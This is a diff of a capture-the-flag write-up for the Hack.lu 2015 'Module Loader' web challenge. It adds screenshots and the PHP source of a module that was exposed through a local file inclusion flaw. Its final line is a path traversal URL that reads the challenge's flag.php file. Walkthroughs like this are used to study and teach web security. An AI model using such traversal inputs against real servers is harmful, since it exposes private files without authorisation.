@@ -11,15 +11,41 @@ Since his students never know what date it is and how much time they have until 
 
 We get simple web application with two available options:
 
-(1)
+![Welcome screen]
+(https://github.com/bl4de/ctf/blob/master/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader1.png)
 
 After quick research there's an obvious LFI (Local File Include)
 
-(2)
+![LFI]
+(https://github.com/bl4de/ctf/blob/master/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader2.png)
 
-It looks like we can see any file we want to as they are just printed out:
 
-date
+It looks like we can see any file we want to as they are just printed out, here's source code of date module:
+
+```php
+<?php 
+if (isset($_GET['time']))
+    $tmp = explode("-", $_GET['time']);
+else
+    $tmp = array(1970, 1, 1);
+$y = (int)$tmp[0];
+$m = (int)$tmp[1];
+$d = (int)$tmp[2];
+
+var_dump($y);
+var_dump($m);
+var_dump($d);
+?>
+<div id="clock"></div>
+<!-- <script src="countdown.js"></script> -->
+<script>
+var clock = document.getElementById("clock");
+var now = new Date();
+clock.innerHTML = countdown(new Date(<?= $y; ?>, <?= $m; ?>, <?= $d; ?>)).toString();
+setInterval(function(){clock.innerHTML = countdown(new Date(<?= $y; ?>, <?= $m; ?>, <?= $d ?>)).toString();}, 1000);
+</script>
+
+```
 
 Also, we can display .htaccess, which contains some directory with quite "obvious" name :P
 
@@ -33,9 +59,14 @@ Also, we can display .htaccess, which contains some directory with quite "obviou
 
 Let's take a look there and here we go:
 
-(3)
+![3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae content]
+(https://github.com/bl4de/ctf/blob/master/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader3.png)
+
 
 Last thing is to use LFI and see, what's in flag.php file:
+
+![Flag]
+(https://github.com/bl4de/ctf/blob/master/HACK.LU_CTF_2015/Module_Loader_web100/Module_Loader4.png)
 
 
 school.fluxfingers.net:1522/?module=../3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae/flag.php
